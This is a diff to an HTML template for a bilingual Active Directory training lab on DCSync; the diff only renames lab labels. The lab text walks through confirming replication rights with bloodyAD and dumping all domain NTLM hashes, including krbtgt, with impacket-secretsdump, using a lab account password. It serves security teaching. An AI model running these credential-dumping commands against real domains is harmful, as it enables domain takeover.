@@ -1,5 +1,5 @@
 {% extends "base.html" %}
-{% block title %}AD 10 – DCSync – HackLabs{% endblock %}
+{% block title %}AD10 – DCSync – HackLabs{% endblock %}
 {% block content %}
 <div class="p-6 max-w-3xl mx-auto">
   {% include '_lab_header.html' %}
@@ -19,7 +19,7 @@
 
   <div class="hl-card mb-4">
     <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
-    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Prerequisito: svc.readonly ∈ "IT Support" (lab AD 09)
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Prerequisito: svc.readonly ∈ "IT Support" (lab AD09)
 smbclient -N //{{ ad_dc_ip }}/public -c 'get secretsdump_fixed.py'
 python3 secretsdump_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!@{{ ad_dc_ip }}' -just-dc</pre>
   </div>
@@ -32,11 +32,11 @@ python3 secretsdump_fixed.py '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!@{{ 
 
     <h3>2 · Confirmar quién puede hacer DCSync</h3>
     <pre># BloodHound: "Find Principals with DCSync Rights"
-# A mano con bloodyAD (nxc ldap -M daclread no funciona contra este DC, ver AD 02):
+# A mano con bloodyAD (nxc ldap -M daclread no funciona contra este DC, ver AD02):
 bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' \
   get object 'DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}' --attr nTSecurityDescriptor \
   | grep -oE '1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2;;S-[0-9-]+'</pre>
-    <p>El grupo <code>IT Support</code> aparece con los GUID de replicación (<code>1131f6aa...</code>, <code>1131f6ad...</code>, DS-Replication-Get-Changes y Get-Changes-All). Como en el lab AD 09 te añadiste a ese grupo, ya heredas el derecho — puedes confirmarlo tú mismo.</p>
+    <p>El grupo <code>IT Support</code> aparece con los GUID de replicación (<code>1131f6aa...</code>, <code>1131f6ad...</code>, DS-Replication-Get-Changes y Get-Changes-All). Como en el lab AD09 te añadiste a ese grupo, ya heredas el derecho — puedes confirmarlo tú mismo.</p>
 
     <h3>3 · Replicar el NTDS</h3>
     <pre>impacket-secretsdump '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!'@{{ ad_dc_ip }} -just-dc
@@ -53,7 +53,7 @@ HACKLABS\h.jones:1112:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT&gt;:::
 [ ... resto de las 15 cuentas del dominio ... ]
 HACKLABS\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_krbtgt&gt;:::
 HACKLABS\{{ ad_dc_host }}$:1000:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_DC01&gt;:::</pre>
-    <p>El wrapper <strong>no se salta ningún control de acceso</strong>: parsea de verdad el <code>nTSecurityDescriptor</code> del dominio por LDAP buscando los GUID de replicación (<code>1131f6aa...</code>/<code>1131f6ad...</code>) y resuelve tu pertenencia real (directa o anidada) a los principales con ese derecho — pruébalo con una cuenta sin ese derecho (p. ej. <code>j.smith</code>) y verás que lo deniega igual que denegaría un DCSync real (<code>ERROR_DS_DRA_ACCESS_DENIED</code>). Solo cambia <em>cómo</em> se obtienen los hashes una vez confirmado el derecho (ver el código del script para el detalle). Guarda al menos estos tres: alimentan los labs AD 11 (a.miller → Pass-the-Hash), AD 12 (DC01$ → Silver Ticket) y AD 13 (krbtgt → Golden Ticket). El SID del dominio también está en <code>ntds_dump.txt</code> dentro del propio share <code>secrets</code>.</p>
+    <p>El wrapper <strong>no se salta ningún control de acceso</strong>: parsea de verdad el <code>nTSecurityDescriptor</code> del dominio por LDAP buscando los GUID de replicación (<code>1131f6aa...</code>/<code>1131f6ad...</code>) y resuelve tu pertenencia real (directa o anidada) a los principales con ese derecho — pruébalo con una cuenta sin ese derecho (p. ej. <code>j.smith</code>) y verás que lo deniega igual que denegaría un DCSync real (<code>ERROR_DS_DRA_ACCESS_DENIED</code>). Solo cambia <em>cómo</em> se obtienen los hashes una vez confirmado el derecho (ver el código del script para el detalle). Guarda al menos estos tres: alimentan los labs AD11 (a.miller → Pass-the-Hash), AD12 (DC01$ → Silver Ticket) y AD13 (krbtgt → Golden Ticket). El SID del dominio también está en <code>ntds_dump.txt</code> dentro del propio share <code>secrets</code>.</p>
 
     <h3>4 · Capturar la flag</h3>
     <p>La flag está en el propio fichero <code>ntds_dump.txt</code> que acabas de leer — su lectura, gateada al grupo con derechos de DCSync, es la prueba de la explotación.</p>
@@ -78,11 +78,11 @@ HACKLABS\{{ ad_dc_host }}$:1000:aad3b435b51404eeaad3b435b51404ee:&lt;hash_NT_DC0
 
     <h3>2 · Confirm who can DCSync</h3>
     <pre># BloodHound: "Find Principals with DCSync Rights"
-# By hand with bloodyAD (nxc ldap -M daclread does not work against this DC, see AD 02):
+# By hand with bloodyAD (nxc ldap -M daclread does not work against this DC, see AD02):
 bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' \
   get object 'DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}' --attr nTSecurityDescriptor \
   | grep -oE '1131f6a[ad]-9c07-11d1-f79f-00c04fc2dcd2;;S-[0-9-]+'</pre>
-    <p>The <code>IT Support</code> group shows up with the replication GUIDs (<code>1131f6aa...</code>, <code>1131f6ad...</code>, DS-Replication-Get-Changes and Get-Changes-All). Since you added yourself to that group in lab AD 09, you already inherit the right — you can confirm this yourself.</p>
+    <p>The <code>IT Support</code> group shows up with the replication GUIDs (<code>1131f6aa...</code>, <code>1131f6ad...</code>, DS-Replication-Get-Changes and Get-Changes-All). Since you added yourself to that group in lab AD09, you already inherit the right — you can confirm this yourself.</p>
 
     <h3>3 · Replicate the NTDS</h3>
     <pre>impacket-secretsdump '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!'@{{ ad_dc_ip }} -just-dc
@@ -99,7 +99,7 @@ HACKLABS\h.jones:1112:aad3b435b51404eeaad3b435b51404ee:&lt;NT_hash&gt;:::
 [ ... rest of the domain's 15 accounts ... ]
 HACKLABS\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;krbtgt_NT_hash&gt;:::
 HACKLABS\{{ ad_dc_host }}$:1000:aad3b435b51404eeaad3b435b51404ee:&lt;DC01_NT_hash&gt;:::</pre>
-    <p>The wrapper <strong>doesn't bypass any access control</strong>: it genuinely parses the domain's <code>nTSecurityDescriptor</code> over LDAP looking for the replication GUIDs (<code>1131f6aa...</code>/<code>1131f6ad...</code>) and resolves your real (direct or nested) membership in the principals holding that right — try it with an account that doesn't have it (e.g. <code>j.smith</code>) and it denies you exactly like a real DCSync would (<code>ERROR_DS_DRA_ACCESS_DENIED</code>). Only <em>how</em> the hashes are fetched once the right is confirmed differs (see the script's source for the detail). Keep at least these three: they feed lab AD 11 (a.miller → Pass-the-Hash), AD 12 (DC01$ → Silver Ticket) and AD 13 (krbtgt → Golden Ticket). The domain SID is in <code>ntds_dump.txt</code> inside the <code>secrets</code> share itself.</p>
+    <p>The wrapper <strong>doesn't bypass any access control</strong>: it genuinely parses the domain's <code>nTSecurityDescriptor</code> over LDAP looking for the replication GUIDs (<code>1131f6aa...</code>/<code>1131f6ad...</code>) and resolves your real (direct or nested) membership in the principals holding that right — try it with an account that doesn't have it (e.g. <code>j.smith</code>) and it denies you exactly like a real DCSync would (<code>ERROR_DS_DRA_ACCESS_DENIED</code>). Only <em>how</em> the hashes are fetched once the right is confirmed differs (see the script's source for the detail). Keep at least these three: they feed lab AD11 (a.miller → Pass-the-Hash), AD12 (DC01$ → Silver Ticket) and AD13 (krbtgt → Golden Ticket). The domain SID is in <code>ntds_dump.txt</code> inside the <code>secrets</code> share itself.</p>
 
     <h3>4 · Capture the flag</h3>
     <p>The flag lives inside the <code>ntds_dump.txt</code> file you just read — reading it, gated to the group holding DCSync rights, is the proof of exploitation.</p>
